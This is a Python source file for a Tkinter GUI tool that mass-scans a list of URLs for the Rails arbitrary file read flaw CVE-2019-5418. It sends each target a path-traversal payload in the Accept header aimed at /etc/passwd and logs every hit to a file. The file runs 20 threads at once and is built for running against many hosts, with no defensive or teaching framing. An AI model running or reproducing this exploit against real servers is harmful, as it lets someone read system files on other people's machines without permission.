import requests
import urllib3
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def Rails_anyfile_read_cve_2019_5418_exp(url):
    poc = r"""/robots"""
    url = url + poc
    headers = {
        "Accept": "../../../../../../../../etc/passwd{{"
    }
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=3)
        if "root" in res.text and "No route matches" not in res.text:
            Rails_anyfile_read_cve_2019_5418_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            Rails_anyfile_read_cve_2019_5418_text.see(END)
            with open ("存在Rails Accept 任意文件读取漏洞(CVE-2019-5418)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Rails_anyfile_read_cve_2019_5418_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            Rails_anyfile_read_cve_2019_5418_text.see(END)
    except Exception as err:
        Rails_anyfile_read_cve_2019_5418_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Rails_anyfile_read_cve_2019_5418_text.see(END)
def get_Rails_anyfile_read_cve_2019_5418_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Rails_anyfile_read_cve_2019_5418_gui():
    Rails_anyfile_read_cve_2019_5418 = tk.Tk()
    Rails_anyfile_read_cve_2019_5418.geometry("910x450")
    Rails_anyfile_read_cve_2019_5418.title("Rails Accept 任意文件读取漏洞(CVE-2019-5418)一把梭")
    Rails_anyfile_read_cve_2019_5418.resizable(0, 0)
    Rails_anyfile_read_cve_2019_5418.iconbitmap('logo.ico')
    global Rails_anyfile_read_cve_2019_5418_text
    Rails_anyfile_read_cve_2019_5418_text = scrolledtext.ScrolledText(Rails_anyfile_read_cve_2019_5418,width=123, height=25)
    Rails_anyfile_read_cve_2019_5418_text.grid(row=0, column=0, padx=10, pady=10)
    Rails_anyfile_read_cve_2019_5418_text.see(END)
    addrs = get_Rails_anyfile_read_cve_2019_5418_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Rails_anyfile_read_cve_2019_5418_exp, addr)
    Rails_anyfile_read_cve_2019_5418.mainloop()